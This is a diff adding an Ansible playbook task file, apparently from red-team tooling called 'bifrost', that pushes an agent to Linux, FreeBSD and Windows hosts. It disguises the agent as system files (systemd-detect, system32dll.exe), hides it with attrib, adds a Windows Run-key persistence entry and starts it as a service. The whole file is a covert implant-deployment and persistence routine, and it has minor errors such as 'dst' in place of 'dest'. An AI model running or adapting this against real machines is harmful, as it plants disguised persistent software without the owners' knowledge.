@@ -1,0 +1,70 @@
+---
+# tasks file for bifrost
+- name: BIFROST | Copy agent | Debian & RedHat
+  copy:
+    src: 'files/bifrost/systemd-detect'
+    dest: /usr/bin/systemd-detect
+    mode: 755
+    when: ansible_os_family == "Debian" or ansible_os_family == "RedHat"
+
+
+- name: BIFROST | Copy agent | FreeBSD
+  copy:
+    src: 'files/bifrost/systemd-journal'
+    dest: /usr/bin/systemd-journal
+    mode: 755
+  when: ansible_os_family == "FreeBSD"
+
+
+- name: BIFROST | Copy agent | Windows
+  copy:
+    src: "files/system32dll.exe"
+    dst: "C:\\ProgramData\\system32dll.exe"
+
+
+- name: BIFROST | Hide agent | Windows
+  win_command: "attrib +h 'C:\\ProgramData\\system32dll.exe'"
+
+
+- name: BIFROST | Add run key persistence | Windows
+  win_regedit: 
+    path: 'HKLM:\Software\Microsoft\Windows\CurrentVersion\Run'
+    name: "system32dll.exe"
+    data: "cmd.exe /c 'C:\\ProgramData\\system32dll.exe'"
+    type: string
+
+
+- name: BIFROST | Copy Bifrost service | Debian & RedHat
+  copy:
+    src: 'files/bifrost/systemd-detect.service'
+    dest: /etc/systemd/system/systemd-detect.service
+  when: ansible_os_family == "Debian" or ansible_os_family == "RedHat" or ansible_os_family == "Kali GNU/Linux"
+
+
+- name: BIFROST | Copy Bifrost service | FreeBSD
+  copy:
+    src: 'files/bifrost/systemd-journal.sh'
+    dest: /usr/local/etc/rc.d/systemd-journal.sh
+    mode: 755
+  when: ansible_os_family == "FreeBSD"
+
+
+- name: BIFROST | Enable and start Bifrost service | Debian & RedHat
+  shell: systemctl enable systemd-detect && systemctl restart systemd-detect
+  when: ansible_os_family == "Debian" or ansible_os_family == "RedHat" or ansible_os_family == "Kali GNU/Linux"
+
+
+- name: BIFROST | Enable and start Bifrost service | FreeBSD
+  shell: /usr/local/etc/rc.d/systemd-journal.sh
+  when: ansible_os_family == "FreeBSD"
+
+
+- name: BIFROST | Run agent | WIndows
+  win_shell: 'runas /trustlevel:0x20000 system32dll.exe'
+  async: 45
+  poll: 0
+  args:
+    chdir: 'C:\\ProgramData'
+  with_fileglob:
+    - "files/*.exe"
+
